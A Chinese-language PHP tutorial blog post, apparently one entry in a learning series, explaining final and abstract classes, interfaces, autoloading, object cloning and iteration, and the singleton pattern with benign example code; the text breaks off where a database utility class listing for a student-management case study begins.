      <title>PHP开发学习--核心编程6</title>
      <link href="2020/01/05/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B6/"/>
      <url>2020/01/05/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B6/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP核心编程6"><a href="#PHP核心编程6" class="headerlink" title="PHP核心编程6"></a>PHP核心编程6</h1><h2 id="最终类和最终方法"><a href="#最终类和最终方法" class="headerlink" title="最终类和最终方法"></a>最终类和最终方法</h2><p>Final关键字修饰的类，就是最终类；</p><p>Final关键字修饰的方法，就是最终方法；</p><p>最终类：该类只能实例化，不能被继承。该类十分完善了，不需要升级和扩展。</p><p>最终方法：该方法可以被继承，但不能重写。该方法十分完善了，不需要重写了。</p><h2 id="抽象类和抽象方法"><a href="#抽象类和抽象方法" class="headerlink" title="抽象类和抽象方法"></a>抽象类和抽象方法</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>abstract关键字修饰的类，就是抽象类；</p><p>abstract关键字修饰的方法，就是抽象方法；</p><p>抽象类：该类不能直接实例化，必须先继承后再实例化。常用在基础类。</p><p>抽象方法：方法必须先继承后重写。</p><p>抽象方法就是方法的命名规范、命名规则、方法大纲，也可以理解为一种监督机制。</p><p>所有的抽象方法都必须重写，少一个都不行。</p><p>抽象方法没有方法体，必须在子类重写后，再定义方法体。</p><p>如果一类中有一个抽象方法，该类必须是抽象类。</p><p>抽象方法权限不能是private，因为要先继承再重写。</p><p>在PHP7中，抽象方法可以是成员方法，也可以是静态方法。</p><p>抽象类中，可以包含其它成员：常量、成员属性、成员方法、静态属性、静态方法</p><h3 id="实例：抽象类和抽象方法实例演示"><a href="#实例：抽象类和抽象方法实例演示" class="headerlink" title="实例：抽象类和抽象方法实例演示"></a>实例：抽象类和抽象方法实例演示</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义抽象学生类：子类方法的目录大纲</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> TITLE = <span class="string">&quot;PHP第69期就业班&quot;</span>;</span><br><span class="line"><span class="comment">//定义成员的抽象方法</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params">$a,$b</span>)</span>;</span><br><span class="line"><span class="comment">//定义静态的抽象方法</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="built_in">static</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readMe</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义传智学生类，并继承学生类</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ItcastStudent</span> <span class="keyword">extends</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//重写showInfo()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params">$name,$age</span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$name&#125;</span>的年龄是<span class="subst">&#123;$age&#125;</span>岁！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重写readMe()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readMe</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="built_in">self</span>::TITLE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建传智学生类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> ItcastStudent;</span><br><span class="line">$obj-&gt;showInfo(<span class="string">&quot;张三四&quot;</span>,<span class="number">24</span>);</span><br><span class="line">$obj-&gt;readMe();</span><br></pre></td></tr></table></figure><h2 id="接口技术"><a href="#接口技术" class="headerlink" title="接口技术"></a>接口技术</h2><h3 id="接口的基本概念"><a href="#接口的基本概念" class="headerlink" title="接口的基本概念"></a>接口的基本概念</h3><p>接口就是特殊的抽象类。</p><p>PHP 类是单继承，也就是不支持多继承。</p><p>当一个类需要多个类的功能时，单继承就无能为力了，为此 PHP 引入了类的接口技术。</p><p>多人合作开发项目时，需要规范各个功能的名称，就需要用到接口技术。</p><p>接口就是一种标准，一种规范。类的功能实现，按照标准接口实现即可；</p><h3 id="接口定义和实现要点"><a href="#接口定义和实现要点" class="headerlink" title="接口定义和实现要点"></a>接口定义和实现要点</h3><p>interface关键字定义接口；</p><p>Implements关键字用来实现接口；</p><p>接口中方法权限必须是public；</p><p>接口中方法默认是抽象的，所以不需要在方法名前面加 abstract ；</p><p>接口中方法可以是成员方法，也可以是静态方法；</p><p>接口中也可以定义常量，但常量不能重写；</p><p>类可以实现(implements)多个接口（相当于把多个功能集于一身，如手机实现了小灵通、MP3、MP4的功能）；</p><p>接口也可以继承(extends)接口，类可以继承(extends)类，但是类只能实现(implements)接口。</p><h4 id="实例：接口的定义和实现演示"><a href="#实例：接口的定义和实现演示" class="headerlink" title="实例：接口的定义和实现演示"></a>实例：接口的定义和实现演示</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义第1个接口InterA</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">InterA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> TITLE = <span class="string">&quot;PHP第69期就业班&quot;</span>;</span><br><span class="line"><span class="comment">//定义一个成员抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params">$a,$b</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义第2个接口InterB</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">InterB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//定义一个静态抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readMe</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义学生类，并实现接口功能</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">InterA</span>,<span class="title">InterB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//重写showInfo()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params">$name,$age</span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$name&#125;</span>的年龄是<span class="subst">&#123;$age&#125;</span>岁！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重写readMe()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readMe</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="built_in">self</span>::TITLE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建学生类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> Student();</span><br><span class="line">$obj-&gt;showInfo(<span class="string">&#x27;张三四&#x27;</span>,<span class="number">26</span>);</span><br><span class="line">$obj-&gt;readMe();</span><br></pre></td></tr></table></figure><h4 id="实例：创建手机类并实现小灵通接口、MP3接口、MP4接口"><a href="#实例：创建手机类并实现小灵通接口、MP3接口、MP4接口" class="headerlink" title="实例：创建手机类并实现小灵通接口、MP3接口、MP4接口"></a>实例：创建手机类并实现小灵通接口、MP3接口、MP4接口</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义小灵通的接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">XiaoLingTong</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//定义打电话的抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">tel</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义Mp3接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Mp3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//定义听音乐的抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">music</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义Mp4接口，并继承Mp3接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Mp4</span> <span class="keyword">extends</span> <span class="title">Mp3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//定义看电影的抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">video</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义手机类，并实现以上所有接口功能</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mobile</span> <span class="keyword">implements</span> <span class="title">XiaoLingTong</span>,<span class="title">Mp4</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//重写tel()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">tel</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;正在打电话！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重写music()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">music</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;正在听音乐！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重写video()抽象方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">video</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;正在看电影！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//添加打游戏方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;正在打游戏！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建手机类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> Mobile();</span><br><span class="line">$obj-&gt;tel();</span><br><span class="line">$obj-&gt;music();</span><br><span class="line">$obj-&gt;video();</span><br><span class="line">$obj-&gt;game();</span><br></pre></td></tr></table></figure><h2 id="类的自动加载"><a href="#类的自动加载" class="headerlink" title="类的自动加载"></a>类的自动加载</h2><h3 id="为什么需要类的自动加载"><a href="#为什么需要类的自动加载" class="headerlink" title="为什么需要类的自动加载"></a>为什么需要类的自动加载</h3><p>很多开发者写面向对象的应用程序时，对每个类的定义，都建立一个独立的 PHP 类文件，方便类文件的统一管理，这无可厚非。但一个很大的烦恼是，不得不在每个脚本开头，写一个长长的包含文件列表（每个类一个文件）。这样一来，就增加了很多负担、占用了很多的内存，对于后期维护也不方便。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201116100953526.png" alt="image-20201116100953526"></p><p>解决方案：按需要加载类文件，而不是把所有类全部包含进来。</p><h3 id="类文件的命名规范"><a href="#类文件的命名规范" class="headerlink" title="类文件的命名规范"></a>类文件的命名规范</h3><p>一个类要单独定义成一个独立的类文件；</p><p>类文件扩展名，要以”.class.php”结尾，是一种约定，不是必须的；</p><p>类文件主名，要与类名一致；</p><p>例如：Db.class.php、UserController.class.php、UserModel.class.php</p><h3 id="类的自定义加载函数：spl-autoload-register"><a href="#类的自定义加载函数：spl-autoload-register" class="headerlink" title="类的自定义加载函数：spl_autoload_register()"></a>类的自定义加载函数：spl_autoload_register()</h3><p>PHP7以下版本，使用__autoload()实现类的自动加载；</p><p>PHP7以上版本，使用spl_autoload_register()实现类的自动加载。</p><p>当试图使用未定义的类时spl_autoload_register自动调用，使用一个类有以下几种情况：</p><p>使用new关键字创建不存在类的对象时，spl_autoload_register自动调用；例如：$obj = new Student()</p><p>当使用静态化方式访问一个不存在的类时，spl_autoload_register自动调用，例如：Student::show()；</p><p>当继承一个不存在的类时，spl_autoload_register自动调用，例如：class Stu extends Parent{}</p><p>当实现一个不存在的接口时，spl_autoload_register自动调用，例如：class Stu implements Inter</p><h4 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h4><p>描述：将函数注册到SPL(标准PHP库)的__autoload函数队列中。如果该队列中的函数尚未激活，则激活它们。它实际上创建了 autoload 函数的队列，按定义时的顺序逐个执行。</p><p>语法：    <code>bool spl_autoload_register ([ callback $autoload_function ] )</code></p><p>参数：$autoload_function，欲注册的自动装载函数，可以是匿名函数，也可以是字符串的函数名称。$autoload_function有一个传递过来的类名形参，用于在函数中构建类文件路径。</p><p>返回：成功时返回 TRUE， 或者在失败时返回 FALSE。</p><h4 id="使用普通函数作为参数"><a href="#使用普通函数作为参数" class="headerlink" title="使用普通函数作为参数"></a>使用普通函数作为参数</h4><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201116101656750.png" alt="image-20201116101656750"></p><h4 id="使用匿名函数作为参数"><a href="#使用匿名函数作为参数" class="headerlink" title="使用匿名函数作为参数"></a>使用匿名函数作为参数</h4><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20201116101840661.png" alt="image-20201116101840661"></p><h2 id="对象克隆"><a href="#对象克隆" class="headerlink" title="对象克隆"></a>对象克隆</h2><h3 id="什么是对象克隆？"><a href="#什么是对象克隆？" class="headerlink" title="什么是对象克隆？"></a>什么是对象克隆？</h3><p>如果已存在了一个对象，而还想再创建一个新对象，并且，两个对象的属性值不一样，或者属性比原来多 ，怎么实现呢？ $obj2 = $obj1 无法实现！</p><p>$obj2 = $obj1，这不是复制对象，而是将$obj1和$obj2指向了同一个对象地址。</p><p>创建新对象有两种方式：a. 使用new关键字； b. 使用 clone 关键字</p><h4 id="实例：对象克隆的演示"><a href="#实例：对象克隆的演示" class="headerlink" title="实例：对象克隆的演示"></a>实例：对象克隆的演示</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $name = <span class="string">&quot;steady&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> $age  = <span class="number">24</span>;</span><br><span class="line"><span class="comment">//克隆方法：当对象克隆完成时，自动调用的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;name = <span class="string">&quot;steady2&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;age  = <span class="number">29</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建学生类对象</span></span><br><span class="line">$obj1 = <span class="keyword">new</span> Student();</span><br><span class="line"><span class="comment">//克隆对象：将$obj1克隆一份，传给$obj2</span></span><br><span class="line"><span class="comment">//克隆对象，是两个独立的新对象</span></span><br><span class="line">$obj2 = <span class="keyword">clone</span> $obj1;</span><br><span class="line">var_dump($obj1,$obj2);</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/Applications/MAMP/htdocs/phpinfo.php:<span class="number">20</span>:</span><br><span class="line"><span class="keyword">object</span>(Student)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;steady&#x27;</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;age&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">24</span></span><br><span class="line">/Applications/MAMP/htdocs/phpinfo.php:<span class="number">20</span>:</span><br><span class="line"><span class="keyword">object</span>(Student)[<span class="number">2</span>]</span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;steady2&#x27;</span> (length=<span class="number">7</span>)</span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;age&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">29</span></span><br></pre></td></tr></table></figure><h4 id="实例：魔术方法-clone-在克隆对象中的使用"><a href="#实例：魔术方法-clone-在克隆对象中的使用" class="headerlink" title="实例：魔术方法__clone()在克隆对象中的使用"></a>实例：魔术方法__clone()在克隆对象中的使用</h4><h3 id="对象遍历"><a href="#对象遍历" class="headerlink" title="对象遍历"></a>对象遍历</h3><p>foreach既可以遍历数组元素，也可以遍历对象属性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//定义一个学生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $name = <span class="string">&quot;张三丰&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> $age  = <span class="number">24</span>;</span><br><span class="line"><span class="keyword">public</span>  $edu  = <span class="string">&quot;大专&quot;</span>;</span><br><span class="line"><span class="comment">//在类内遍历对象属性</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//在类外遍历对象的属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;在类内遍历对象的属性&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">$this</span> <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$this-&gt;<span class="subst">&#123;$key&#125;</span> = <span class="subst">&#123;$value&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建学生类对象</span></span><br><span class="line">$obj = <span class="keyword">new</span> Student();</span><br><span class="line">$obj-&gt;showInfo();</span><br><span class="line"><span class="comment">//在类外遍历对象的属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;在类外遍历对象的属性&lt;/h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>($obj <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$obj-&gt;<span class="subst">&#123;$key&#125;</span> = <span class="subst">&#123;$value&#125;</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="面向对象的设计模式"><a href="#面向对象的设计模式" class="headerlink" title="面向对象的设计模式"></a>面向对象的设计模式</h2><h3 id="什么是对象设计模式？"><a href="#什么是对象设计模式？" class="headerlink" title="什么是对象设计模式？"></a>什么是对象设计模式？</h3><p>设计模式（Design pattern）是一套被反复使用、多数人知晓的、经过分类编目的、代码设计经验的总结。使用设计模式是为了可重用代码、让代码更容易被他人理解、保证代码可靠性。</p><h3 id="常用的设计模式有哪些？"><a href="#常用的设计模式有哪些？" class="headerlink" title="常用的设计模式有哪些？"></a>常用的设计模式有哪些？</h3><p>单例设计模式：一个类只能创建一个实例对象，不管用什么办法都无法创建第2个对象；</p><p>工厂设计模式：生产不同类对象的工厂；</p><p>策略设计模式：定义一组算法，将每个算法都封装起来，并且使它们之间可以互换。</p><p>观察者设计模式：定义对象间一种一对多的依赖关系，使得每当一个对象改变状态，则所有依赖于它的对象都会得到通知并被自动更新。</p><h3 id="单例设计模式的要求-三私一公"><a href="#单例设计模式的要求-三私一公" class="headerlink" title="单例设计模式的要求(三私一公)"></a>单例设计模式的要求(三私一公)</h3><p>一私：私有的静态的保存对象的属性。</p><p>一私：私有的构造方法，阻止类外new对象。</p><p>一私：私有的克隆方法，阻止类外clone对象。</p><p>一公：公共的静态的创建对象的方法。</p><h3 id="实例：单例设计模式演示"><a href="#实例：单例设计模式演示" class="headerlink" title="实例：单例设计模式演示"></a>实例：单例设计模式演示</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//单例设计模式的核心代码</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Db</span> </span>&#123;</span><br><span class="line"><span class="comment">//私有的静态的保存对象的属性</span></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> $obj = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//私有的构造方法：阻止类外new对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//私有的克隆方法：阻止类外clone对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="comment">//公共的静态的创建对象的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//判断当前对象是否存在</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">self</span>::$obj <span class="keyword">instanceof</span> <span class="built_in">self</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果对象不存在，创建并保存它</span></span><br><span class="line"><span class="built_in">self</span>::$obj = <span class="keyword">new</span> <span class="built_in">self</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回对象</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::$obj;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建数据库类的对象</span></span><br><span class="line">$db1 = Db::getInstance();</span><br><span class="line">$db2 = Db::getInstance();</span><br><span class="line">var_dump($db1,$db2);</span><br></pre></td></tr></table></figure><h1 id="综合案例：学生信息管理系统"><a href="#综合案例：学生信息管理系统" class="headerlink" title="综合案例：学生信息管理系统"></a>综合案例：学生信息管理系统</h1><h2 id="数据库工具类"><a href="#数据库工具类" class="headerlink" title="数据库工具类"></a>数据库工具类</h2><p>数据库工具类遵循单例模式，三私–私有对象、私有属性、私有构造方法和克隆方法，一公–公共方法用来生成对象。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 